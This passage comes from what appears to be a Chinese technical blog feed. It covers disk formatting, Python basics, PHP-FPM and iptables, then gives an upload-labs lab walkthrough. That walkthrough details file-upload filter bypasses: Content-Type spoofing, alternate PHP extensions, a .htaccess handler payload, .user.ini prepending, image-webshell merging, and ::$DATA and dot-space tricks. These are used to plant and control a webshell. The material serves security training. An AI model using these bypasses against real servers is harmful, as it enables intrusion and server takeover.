ext4等)。这一步会<u>确定数据的存储方式</u>，包括如何组织文件、目录结构，以及如何管理磁盘空间。</li></ul></li><li><strong>磁盘块的初始化</strong>：<ul><li>在格式化过程中，操作系统会将每个磁盘块标记为可用或不可用，并且可能会清空已有的数据（在快速格式化中，数据并未真正被删除，而是在文件系统中被标记为可用）。</li></ul></li><li><strong>引导扇区的写入</strong>：<ul><li>格式化不仅涉及文件系统数据结构的创建，还会在磁盘的开始位置写入引导扇区（Boot Sector），用于启动操作系统</li></ul></li></ol><h2 id="为什么要格式化磁盘分区"><a href="#为什么要格式化磁盘分区" class="headerlink" title="为什么要格式化磁盘分区"></a>为什么要格式化磁盘分区</h2><ol><li><strong>准备磁盘使用</strong>：<ul><li>在使用新的硬盘或新分区之前，格式化是准备该磁盘为操作系统和用户数据服务的重要步骤，确保数据能够有效存储和检索。</li></ul></li><li><strong>清理旧数据</strong>：<ul><li>格式化可以清理已有的数据，防止信息泄露，尤其是在处理二手硬盘或不再需要的数据时。</li></ul></li><li><strong>创建文件系统</strong>：<ul><li>格式化为分区创建合适的文件系统，使操作系统能够有效地管理文件和目录，从而提高操作效率。</li></ul></li><li><strong>修复文件系统</strong>：<ul><li>在某些情况下，格式化可以用于修复损坏的文件系统（通常需要重新格式化整个分区），尽管这样会导致数据丢失。</li></ul></li><li><strong>优化存储性能</strong>：<ul><li>在长时间使用后，磁盘上的数据可能会变得零散，通过重新格式化，可以优化磁盘空间的使用，提高性能。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LVM逻辑卷管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python安全开发</title>
      <link href="/2024/07/17/python-an-quan-kai-fa/"/>
      <url>/2024/07/17/python-an-quan-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Python安全开发"><a href="#Python安全开发" class="headerlink" title="Python安全开发"></a>Python安全开发</h1><p>Python官网：<a href="https://pypi.org/">PyPI · The Python Package Index</a></p><blockquote><p>Python擅长的：</p><ol><li>安全脚本开发，提高工作效率</li><li>自动化运维、日志分析等</li><li>针对特定的服务器环境，开发安全测试工具</li><li>安全基线检查</li><li>资产收集、资产管理、信息收集</li></ol></blockquote><h2 id="PIP"><a href="#PIP" class="headerlink" title="PIP"></a>PIP</h2><blockquote><p>pip主要用于在线安装第三方库</p></blockquote><p>安装：pip install xxxx</p><p>列出：pip list</p><p>过滤：pip list | findstr xxx</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ol><li>数字：整数、小数、负数 ，python属于弱类型语言，不强制区分数据类型</li><li>字符串：（单双引号包裹）（三引号：用于多行预定义格式）</li><li>布尔型：True/False</li><li>列表：a=[1,2,3,4] b=[“张三”,“李四”]，在PHP中叫索引数组，在JavaScript中叫数组</li><li>字典：a={‘name’:’张三’,’age’:25,’sex’:’男’,’phone’:’123123’}，在PHP中叫关联数组，在JavaScript中叫对象，python中的列表与字典，与JSON的格式完全一致</li><li>集合：与列表相似，是不重复的列表，在集合中不允许出现重复的数据</li><li>元组：tuple，与列表相同，中括号变圆括号 a=(1,2,3,4）,与列表不同的是不能修改 </li><li>对象：用class声明的</li><li>空类型：None</li></ol><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><blockquote><p>变量名区分大小写</p><p>不允许使用中文全拼</p><p>所有的命名，必须有意义</p><p>针对函数名或变量名，超过一个单词，建议使用下划线分开，也可以使用驼峰</p><p>类名建议使用大驼峰，People，MyPhone</p></blockquote><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#：注释一行</p><p>三个单引号或双引号：注释多行</p><h3 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string='HHHHHH'</span><br><span class="line">phone=1234567</span><br><span class="line">#phone=input("请输入:")</span><br><span class="line">print(string+str(phone))</span><br><span class="line">print('%s%d' % (string,phone))//占位符的方式</span><br><span class="line">print(f'{string}{phone}')//格式化</span><br><span class="line">print('{}{}'.format(string,phone))//格式化</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FastCGI与PHP-FPM</title>
      <link href="/2024/07/11/fastcgi-yu-php-fpm/"/>
      <url>/2024/07/11/fastcgi-yu-php-fpm/</url>
      
        <content type="html"><![CDATA[<h1 id="FastCGI与PHP-FPM"><a href="#FastCGI与PHP-FPM" class="headerlink" title="FastCGI与PHP-FPM"></a>FastCGI与PHP-FPM</h1><blockquote><p>CGI:（Common Gateway Interface）是一种 Web 服务器与外部程序进行交互的标准接口，Web服务器接受请求，一个请求对应一个进程，因而<u>可能存在频繁创建和销毁进程</u></p></blockquote><blockquote><p>FastCGI：<strong>引入进程池，减少进程的创建和销毁</strong>，但是仍然一个问题，<u>就是进程池管理不够灵活</u>，假如进程池中预先创建了CGI程序，但是来了5个请求，那么会有2个请求将要等待</p></blockquote><blockquote><p>PHP-FPM（PHP FastCGI Process Manager）是 PHP 的一个 FastCGI 进程管理器，是在FastCGI之上的优化。它们之间的关系是，PHP-FPM 是 PHP 运行在 FastCGI 模式下的一个进程管理器，<strong>可以提供更灵活的进程管理，动态调整进程数</strong>，用于提供更快的 PHP 程序执行速度和更好的资源利用率。</p></blockquote><blockquote><p>Apache MPM (Multi-Processing Module) 是 Apache HTTP 服务器的一种核心模块，负责处理进程和线程管理。MPM 模块的作用是决定 Apache 服务器如何处理并发请求，从而影响服务器的性能和稳定性。不同的 MPM 模块采用不同的处理方式</p><ul><li>Prefork MPM：使用多个独立的<strong>进程</strong>处理请求，每个进程对应一个独立的进程，适用于低并发，堆内存消耗敏感的场景</li><li>Worker MPM：使用多个<strong>线程</strong>处理请求，中等并发，需求资源较少的场景</li><li>Event MPM：与worker大致差不多，多一个利用多路复用技术和事件驱动机制，适合高并发和长连接的场景，优势是线程在非活动状态时可以切换到其他连接，充分利用处理能力</li></ul><p>选择合适的 MPM 模块取决于服务器的配置和需求，不同的 MPM 模块适用于不同的场景。通过配置 Apache 的 MPM 模块，可以优化服务器的性能，提高并发处理能力和稳定性。</p></blockquote><p>通过 CGI 接口，Web 服务器（如 Apache、Nginx 等）可以与外部的 PHP 程序进行通信，实现动态 Web 页面的生成。PHP-FPM 则是一个在此过程中负责管理 PHP 进程的工具，它可以有效地管理 PHP 进程池，并提供更好的性能和稳定性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>iptables防火墙</title>
      <link href="/2024/07/05/iptables-fang-huo-qiang/"/>
      <url>/2024/07/05/iptables-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="iptables防火墙"><a href="#iptables防火墙" class="headerlink" title="iptables防火墙"></a>iptables防火墙</h1><h2 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h2><p><img src="https://pic.imgdb.cn/item/66b1cdead9c307b7e9792589.png"></p><p><strong>默认的4个规则表</strong></p><p>raw表：确定是否对该数据包进行状态跟踪</p><p>mangle表：为数据包设置标记</p><p>nat表：修改数据包中的源、目标ip地址或端口</p><p>filter表：确定是否放行该数据包（过滤）</p><p><strong>默认的5种规则链：</strong></p><p>INPUT:处理入站数据包</p><p>OUTPUT:处理出站数据包</p><p>FORWARD:处理转发数据包</p><p>POSTROUTING:在进行路由选择后处理数据包</p><p>PREROUTING:在进行路由选择前处理数据包</p><ul><li><p>其中input、output链主要用在“主机型防火墙”中，主要针对服务器本机进行保护；</p></li><li><p>而FORWARD\POSTROUTING\PREROUTING多用在“网络型防火墙”中，如使用Linux防火墙作为网关服务器，在公司内网与Ineternet之间进行安全控制。</p></li></ul><h2 id="匹配顺序"><a href="#匹配顺序" class="headerlink" title="匹配顺序"></a>匹配顺序</h2><p>（1）<strong>规则表之间的顺序</strong>: raw mangle nat filter (从左到右）</p><p>（2）<strong>规则链之间的顺序</strong>：不同链的处理时机比较固定，顺序取决于数据包的流向。</p><p>入站数据流向： 来自外界的数据包到达防火墙后，首选被<strong>PREROUTING链</strong>处理，然后进行路由选择；如果数据包的目的地址是防火墙本机，交给<strong>INPUT链</strong>进行处理，通过以后再交给系统上层应用程序进行响应。</p><p>转发数据流向： 来自外界的数据包到达防火墙后，<strong>首选被PREROUTING</strong>链处理，然后进行路由选择；如果数据包的目标地址是其他外部地址，则交给<strong>FORWARD链</strong>进行处理，最后交<strong>给POSTROUTING链</strong>进行处理。</p><p>出站数据流向：防火墙本机向外部地址发送数据包，首选被OUTPUT链处理，然后进行路由选择，再交给<strong>POSTROUTING</strong>链进行处理。 </p><p><strong>（3）</strong>规则链内部各条防火墙规则之间的顺序：<strong>从上往下，一旦匹配，立即终止。</strong></p><h2 id="常用的管理选项"><a href="#常用的管理选项" class="headerlink" title="常用的管理选项"></a>常用的管理选项</h2><p>-A：在链尾追加一条新的规则</p><p>-I：在指定位置（或链首）插入一条新的规则</p><p>-P：设置指定链的默认策略</p><p>-L：列表查看各条规则信息</p><p>-D：删除指定位置或内容的规则-F:清空规则链内的所有规则</p><p>-h：查看iptables命令的使用帮助</p><h2 id="目标动作"><a href="#目标动作" class="headerlink" title="目标动作"></a>目标动作</h2><p>ACCEPT:放行数据包</p><p>DROP:丢弃数据包</p><p>REJECT:拒绝数据包</p><p>SNAT:修改数据包的源地址信息</p><p>DNAT:修改数据包的目标地址信息</p><h2 id="条件匹配"><a href="#条件匹配" class="headerlink" title="条件匹配"></a>条件匹配</h2><p>（1）通用匹配:</p><p>可直接使用。不依赖于其他的条件或扩展模块；</p><p>包括网络协议、IP地址、网络接口等匹配方式。</p><p>（2）协议匹配</p><p>使用“-p协议名”的形式；</p><p>协议名可使用在“letc/protocols”文件中定义的名称；</p><p>常用的协议包括tcp、 udp、icmp等。</p><p>（3）地址匹配</p><p>使用“-s源地址”、“-d目标地址”的形式；</p><p>地址可以是单个IP地址、网络地址（带掩码长度)。</p><p>（4）接口匹配</p><p>使用“-i网络接口名”、“-o网络接口名”的形式,分别对应接收、发送数据包的网络接口。</p><p>（5）隐含条件匹配 </p><p>一般以特定的协议匹配作为前提，包括端口、TCP标记、ICMP类型等匹配方式。</p><p>• 端口匹配 </p><p>使用“–sport源端口”、“–dport目标端口”的形式；</p><p>采用“端口1:端口2””的形式可以指定一个范围的端口。</p><p>• TCP标记匹配</p><p>使用“–tcp-flags检查范围被设置的标记”的形式；</p><p>如“–tcp-flags sYN,RST,ACK SYN”表示检查SYN、</p><p>RST、ACK这3个标记，只有SYN为1时满足条件。</p><p>• ICMP类型匹配</p><p>使用“–icmp-type ICMP类型”的形式；</p><p>ICMP类型可以使用类型字符串或者对应的数值，例如Echo-Request、Echo-Reply。</p><p>（5）显式条件匹配</p><p>  需要使用“-m扩展模块”的形式明确指定匹配方式。</p><p>• MAC地址匹配</p><p>使用“-m mac”结合“–mac-source MAC地址”的形式</p><p>• 多端口匹配</p><p>使用“-m multiport””结合“–sports源端口列表”或者“–dports目标端口列表”的形式</p><p>多个端口之间使用逗号“,”分隔，连续的端口也可以使用冒号“:”分隔。</p><p>• IP地址范围匹配</p><p>使用“-m iprange”结合“–src-range源IP范围”或者–dst-range目标IP范围”的形式</p><p>以“-”符号连接起始P地址、结束IP地址</p><h2 id="iptables语法格式"><a href="#iptables语法格式" class="headerlink" title="iptables语法格式"></a>iptables语法格式</h2><p><strong>iptables [-t 表名] 管理选项 [链名] [条件匹配] [-j 目标动作]</strong></p><h2 id="iptables基本配置案例"><a href="#iptables基本配置案例" class="headerlink" title="iptables基本配置案例"></a>iptables基本配置案例</h2><p>（1）查看的是fileter表中的信息，并显示行号 </p><p># iptables -L –line-number</p><p># iptables -L INPUT –line-number</p><p>（2） 没有-t 指定表名，默认清空fileter表中的信息</p><p>   # iptables -F</p><p>（3） 在<strong>链首</strong>追加一条规则</p><p>   # iptables -t filter -I INPUT -d 192.168.181.151 -p tcp –dport 80 -j ACCEPT</p><p>（4） 在<strong>第一个位置</strong>插入一条规则</p><p># iptables -I INPUT -s 192.168.10.1 -d 192.168.10.132 -p tcp –dport 22 -j ACCEPT </p><p>（5） 在<strong>第5条规则前</strong>插入一条规则</p><p># iptables -t filter -I INPUT <strong>5</strong> -d 192.168.181.151 -p tcp –dport 22 -j REJECT </p><p>（6） 删除INPUT链中的第一条规则</p><p># iptables -D INPUT 1 </p><p>（7） 设置默认策略为拒绝所有连接</p><p># iptables -P INPUT DROP  </p><p>（8） 设置默认策略为允许已建立的规则进行连接</p><p># iptables -P INPUT ACCEPT </p><p>（9） 查看帮助信息</p><p># iptables -h </p><p>（10）查看iptables手册</p><p># man iptables  </p><p>（11）拒绝192.168.0.1访问web服务</p><p># iptables -A INPUT -s 192.168.0.1 -p tcp –dport 80 -j REJECT</p><p>（12）拒绝192.168.0.0/24ping通服务器</p><p># iptables -A INPUT -s 192.168.0.0/24 -p icmp -j REJECT</p><p>（13）允许192.168.1.0/24访问服务器的21与80端口</p><p># iptables -A INPUT -s 192.168.1.0/24 <strong>-m multiport</strong> -p tcp –dports 21,80 -j ACCEPT</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li><p>不指定表名时，默认表示**<u>filter表</u>**</p></li><li><p>不指定链名时，默认表示该表内所有链</p></li><li><p>除非设置规则链的缺省策略,否则需要指定匹配条件</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2024/06/17/upload-labs/"/>
      <url>/2024/06/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>使用工具：<br>burpsuite<br>中国蚁剑</p><h2 id="Pass-01-前端js绕过"><a href="#Pass-01-前端js绕过" class="headerlink" title="Pass-01 前端js绕过"></a>Pass-01 前端js绕过</h2><blockquote><p>前端JS代码对上传文件合法性的验证</p></blockquote><ol><li>先上传一个不合法php文件来测试</li></ol><p><img src="https://pic.imgdb.cn/item/666fe4a3d9c307b7e9085db1.png"></p><p><img src="https://pic.imgdb.cn/item/666fdd20d9c307b7e9fa577e.png"></p><ol start="2"><li>该文件类型不允许上传</li></ol><p><img src="https://pic.imgdb.cn/item/666fdd5dd9c307b7e9fabe43.png"></p><ol start="3"><li>burpsuite未抓到包，则证明上传的文件在前端就被拦截，还未到传给服务器的步骤</li></ol><img src="https://pic.imgdb.cn/item/666fde6ad9c307b7e9fc8a34.png" style="zoom:67%;"><ol start="4"><li>他只允许图片（jpg、png）及动图（gif）文件上传，那么我们就将文件改为图片的后缀来上传，从而绕过前端的拦截</li></ol><p><img src="https://pic.imgdb.cn/item/666fdf36d9c307b7e9ff1840.png"></p><ol start="5"><li>能抓到包，证明绕过了前端验证</li></ol><p><img src="https://pic.imgdb.cn/item/666fe4d3d9c307b7e908b3fd.png"></p><ol start="6"><li>然后将文件后缀名从jpg重新改回php上传，一句话木马就植入服务器了，这里看到打开图片连接，实际上是php文件</li></ol><p><img src="https://pic.imgdb.cn/item/666fe50fd9c307b7e9092267.png"></p><ol start="7"><li>可以用后门连接工具（蚁剑）来连接并控制服务器，输入url和连接密码（也就是post传入的参数）</li></ol><p><img src="https://pic.imgdb.cn/item/666fe546d9c307b7e909882e.png"></p><ol start="8"><li>连接成功，并添加，打开数据记录就可以控制服务器目录</li></ol><p><img src="https://pic.imgdb.cn/item/666fe5fed9c307b7e90ace82.png"></p><ol start="9"><li>可以对服务器的目录进行操作，此处演示删除操作</li></ol><p><img src="https://pic.imgdb.cn/item/666fe642d9c307b7e90b439f.png"></p><blockquote><p>另一个方法：</p><p>在网页前端设置中禁用JavaScript，就可以正常上传php文件了</p></blockquote><ol><li>鼠标右键-检查-设置-禁用JavaScript</li></ol><p>设置：</p><p><img src="https://pic.imgdb.cn/item/6673d15cd9c307b7e981140b.png"></p><p>禁用：</p><p><img src="https://pic.imgdb.cn/item/6673d1b7d9c307b7e981b7b0.png"></p><h2 id="Pass-02-content-type绕过"><a href="#Pass-02-content-type绕过" class="headerlink" title="Pass-02 content-type绕过"></a>Pass-02 content-type绕过</h2><blockquote><p>基本流程第一步先上传php文件去尝试，回显文件类型错误，猜测通过content-type的内容来拦截不合法的文件格式上传</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673d7cfd9c307b7e98e0866.png"></p><ol><li>用burpsuite先抓包，拦下数据包，然后将php文件的conten-type内容改为图像对应的内容（image/jpeg）上传，即可绕过</li></ol><p>原始包内容：</p><p><img src="https://pic.imgdb.cn/item/6673d585d9c307b7e989d6f1.png"></p><p>修改后：</p><p><img src="https://pic.imgdb.cn/item/6673d5b1d9c307b7e98a21e9.png"></p><p>然后放行，显示上传成功</p><p>同样可以用蚁剑来连接</p><h2 id="Pass-03-特殊后缀绕过"><a href="#Pass-03-特殊后缀绕过" class="headerlink" title="Pass-03 特殊后缀绕过"></a>Pass-03 特殊后缀绕过</h2><blockquote><p>先上传php文件去尝试，回显不允许上传的文件后缀名，猜测对后缀名写了黑名单，来拦截不合法的文件格式上传</p><p>可以通过上传同样可以被解析为php文件的一些后缀，类似php3、php5、phtml等，是否能成功取决于中间件（apache）的配置文件中是否有设置</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673d878d9c307b7e98f2e6b.png"></p><blockquote><p>更改apache配置文件：设置什么样的文件后缀可以php的方式来解析</p></blockquote><ul><li>步骤：打开配置文件-（httpd-config）-找到addtype</li></ul><p><img src="https://pic.imgdb.cn/item/6673dc06d9c307b7e995e954.png"></p><ul><li>找到addtype，取消注释，添加类型</li></ul><p><img src="https://pic.imgdb.cn/item/6673dd03d9c307b7e997d319.png"></p><blockquote><p>如果还是不行，那么考虑是php的版本问题，切换到不带nts的低版本，就可以用蚁剑连接成功</p><p>nts（非多线程安全）、ts（多线程安全）</p></blockquote><ol><li><p>上传php文件，在burpsuite中将后缀名改为php5（php3，phtml）然后放行，关闭抓包</p></li><li><p>打开图片链接，并且复制图片链接，在蚁剑上连接</p></li></ol><h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><blockquote><p>老样子，先上传php文件，看回显，文件不允许上传</p><p>作为练习，那么看源码来分析</p></blockquote><p><img src="https://pic.imgdb.cn/item/6673df89d9c307b7e99cce97.png"></p><p>源码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini"); //后缀名黑名单</span><br><span class="line">        $file_name = trim($_FILES['upload_file']['name']); //去除文件名中的前和后空格</span><br><span class="line">        $file_name = deldot($file_name);   //删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, '.');   //从文件名中提取文件的扩展名</span><br><span class="line">        $file_ext = strtolower($file_ext);    //转换为小写</span><br><span class="line">        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext);    //收尾去空</span><br></pre></td></tr></tbody></table></figure><p>​.htaccess文件在站点的根目录下面，不是在apache目录下，但它属于apache的一个局部配置文件，它负责相关目录下的网页配置，修改后即生效。而httpd.onf是apache全局主配置文件，影响整个服务器，修改后需重启服务器才生效</p><p>​通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p><p>​其中.htaccess文件中的“SetHandler application/x-http-php”的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错。.htaccess通常用于伪静态的一个转换。           </p><p><strong>前提条件：</strong>目标服务器apache必须开启“mod_rewrite”模块和“AllowOverride ALL”。</p><p><img src="https://pic.imgdb.cn/item/6673e634d9c307b7e9aa5fdf.png"></p><p><img src="https://pic.imgdb.cn/item/6673e649d9c307b7e9aa8720.png"></p><p><img src="https://pic.imgdb.cn/item/6673eef5d9c307b7e9b9fcc0.png"></p><ol><li>写一个.htaccess文件并上传，内容为：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php   //将所有文件都解析成PHP文件</span><br><span class="line">或者</span><br><span class="line">AddType application/x-httpd-php .jpg .txt   //将jpg或txt以php来解析</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>将一句话木马的php后缀改为jpg或者txt，然后上传，蚁剑连接的时候后缀就是jpg，可以连接</li></ol><blockquote><p> 也可以将php文件合并到图片文件中一起上传</p></blockquote><p><u>方法1：</u></p><ul><li>在文件当前目录打开cmd，输入命令合并两个文件</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.php+1.jpg/b 000.jpg</span><br></pre></td></tr></tbody></table></figure><p>/b:二进制</p><p>000.jpg：合并之后的文件</p><p><u>方法2：</u></p><ul><li>burpsuite抓包，上传一个图片，在图片的内容最后加上一句话木马内容，然后上传</li></ul><blockquote><p>当然，如果只看这道题，还有一个方法绕过</p></blockquote><ul><li><p>抓包之后将文件名改为“shell.php. .”（加了点 空格 点），是根据源码过滤规则来绕过的，过滤之后发往服务器的文件名是“shell.php.”，然后需要知道windows的命名规则中后缀名之后的”空格”和”.”是会被去除的</p></li><li><p>所以服务器中保存到文件名为“shell.php”</p></li></ul><h2 id="Pass-05-user-ini绕过"><a href="#Pass-05-user-ini绕过" class="headerlink" title="Pass-05 .user.ini绕过"></a>Pass-05 .user.ini绕过</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul><li><p>.htaccess<br>  作用:分布式配置文件，一般用于URL重写、认证、访问控制等<br>  作用范围:特定目录(一般是网站根目录)及其子目录<br>  优先级:<strong>较高</strong>，可覆盖 Apache的主要配置文件(httpd-conf)<br>  生效方式:修改后立刻生效</p></li><li><p>httpd-conf<br>  作用:包含 Apache·HTTP服务器的全局行为和默认设置<br>  作用范围:整个服务器<br>  优先级:较低<br>  生效方式:管理员权限，重启服务器后生效</p></li><li><p>.user.ini<br>  作用:特定于用户或特定目录的配置文件,通常位于Web应用程序的根目录下，它用于覆盖或追加全局配置文件(如php.ini)中的PHP配置选项。<br>  作用范围:存放该文件的目录以及其子目录<br>  优先级:<strong>较高</strong>，可以覆盖 php.ini<br>  生效方式:立即生效</p></li><li><p>php.inie<br>  作用:存储了对整个PHP环境生效的配置选项。它通常位于PHP安装目录中<br>  作用范围:所有运行在该PHP环境中的PHP请求<br>  优先级:·较低<br>  生效方式:重启 php或 web 服务器</p></li></ul><blockquote><p>.user.ini可以生效的前提：</p></blockquote><ul><li>php版本最好是7.x的版本</li><li>Server API为CGI/FastCGI（通过phpinfo查看）</li></ul><blockquote><p>.user.ini文件上传漏洞的前提：</p></blockquote><ul><li>.user.ini可以生效</li><li>并且上传目录由php文件</li></ul><p>写法：</p><p>auto_prepend_file=shell.txt（这个文件中包含php内容）</p><p>A：echo“hello”.php </p><p>B：echo“world”.txt</p><p>auto_prepend_file=B.txt………………hello world</p><ol><li>写一个.user.ini文件，此文件的作用是在该目录下上传文件时都会预先加载文件中的内容，此处内容则是预先加载shell.jpg文件去包含一句话木马，这意味着在每个 PHP 脚本执行之前，都会先执行 shell.jpg 文件，然后将其上传</li></ol><p><img src="https://pic.imgdb.cn/item/667698dcd9c307b7e9882677.png"></p><ol start="2"><li>然后再上传shell.jpg文件（包含一句话木马），为了方便查看加一句显示的语句</li></ol><p><img src="https://pic.imgdb.cn/item/66769a87d9c307b7e98aede6.png"></p><ol start="3"><li>上传的目录中自己包含一个readme.php文件，在网页上访问此文件，就会首先加载shell.jpg文件，则会输出“上传成功”，此处因为编码方式不同出现乱码，但是其实已经包含成功</li></ol><p><img src="https://pic.imgdb.cn/item/66769b08d9c307b7e98bb61a.png"></p><blockquote><p>同样，根据这道题的源码来看，可以通过点空格点来绕过</p></blockquote><h2 id="Pass-06-大写绕过"><a href="#Pass-06-大写绕过" class="headerlink" title="Pass-06 大写绕过"></a>Pass-06 大写绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名转为小写的代码，可以使用大写绕过</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名任意字母改为大写，然后上传</li></ul><p><strong>注意</strong>：版本要调低，这里我用的是php5.4.45，版本太高无法连接</p><h2 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07 空格绕过"></a>Pass-07 空格绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名去除首尾空格的代码，可以使用空格绕过</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上空格，然后上传</li></ul><h2 id="Pass-08-后缀加点绕过"><a href="#Pass-08-后缀加点绕过" class="headerlink" title="Pass-08 后缀加点绕过"></a>Pass-08 后缀加点绕过</h2><blockquote><p>查看源码，发现没有将文件扩展名去除末尾点的代码，可以使用后缀加点绕过</p></blockquote><ul><li><p>上传文件，burpsuite抓包，然后将文件后缀名最后加上一个点，然后上传</p></li><li><p>前面这三种类型为什么能绕过呢？原理就是增加特殊字符，从而绕开黑名单的过滤</p></li></ul><h3 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h3><p>​在Windows操作系统中，当你看到文件名后跟着”::$DATA”时，它表示文件的一个附加数据流(Alternate·DataStream，ADS)。数据流是一种用于在文件内部存储额外数据的机制。<br>​在普通情况下，我们使用的文件只有一个默认的数据流，可以通过文件名访问。但是WindowS·NT·文件系统(NTFS)支持在文件内部创建额外的数据流，以存储其他信息。这些额外的数据流可以通过在文件名后面添加”::DATA”来访问。<br>​例如，”1.txt”是一个文件，而”1.txt::$DATA”是这个文件的一个附加数据流。这样的数据流可以用于存储文件的元数据、备份信息、标签等。<br>​需要注意的是，<strong>大多数常规的文件操作工具不会意识到这些额外的数据流，而只会处理默认</strong><br><strong>的数据流</strong>。要访问或操作这些附加数据流，通常需要使用特定的命令行工具或编程接口。</p><p>写入方法：</p><p>echo 内容 &gt;&gt;文件名:数据流名</p><p>type 文件名 &gt;&gt;文件名:数据流名</p><p>查看方法：</p><p>notepad 文件名:数据流名</p><p>例子：</p><ol><li>创建一个txt文件，并写入内容</li></ol><p><img src="https://pic.imgdb.cn/item/668913c9d9c307b7e90db9f4.png"></p><ol start="2"><li>给该文件写一个附加数据流，用notepad查看文件只显示文件内容，不显示附加数据流内容</li></ol><p><img src="https://pic.imgdb.cn/item/6689143cd9c307b7e90e8850.png"></p><p><img src="https://pic.imgdb.cn/item/668913c9d9c307b7e90db9f4.png"></p><ol start="3"><li>按此方法查看，就可以查看附加数据流，“你好”</li></ol><p><img src="https://pic.imgdb.cn/item/6689155ed9c307b7e910898f.png"></p><ol start="4"><li>type：将2.txt写入1.txt的额外数据流</li></ol><p><img src="https://pic.imgdb.cn/item/6689174ed9c307b7e9157dc2.png"></p><h2 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09 ::$DATA绕过"></a>Pass-09 ::$DATA绕过</h2><blockquote><p>::$DATA结尾的是文件附加数据流，在PHP中文件附加数据流是不会验证文件后缀的，因为他仅表示一个文件流，不是一个文件</p></blockquote><ul><li><p>上传文件，burpsuite抓包，然后将文件后缀名最后加上::$DATA，然后上传，因为他已经是一个文件附加数据流了，所有不是文件，不检查文件后缀名</p></li><li><p>上传之后，Windows操作系统的会将后缀名的::$DATA去除，也就成了文件，而不再是文件数据流了</p></li></ul><h2 id="Pass-10-点空格点绕过"><a href="#Pass-10-点空格点绕过" class="headerlink" title="Pass-10 点空格点绕过"></a>Pass-10 点空格点绕过</h2><blockquote><p>查看源码，根据代码执行顺序，可以看出(php. .)在每一条代码之后过滤，还剩一个点，从而使它不是php文件，从而绕过，而上传之后windows操作系统在处理后缀名时，会删除后缀名中的点，从而得到最终上传上去的php文件</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上点空格点，然后上传</li></ul><h2 id="Pass-11-后缀双写绕过"><a href="#Pass-11-后缀双写绕过" class="headerlink" title="Pass-11 后缀双写绕过"></a>Pass-11 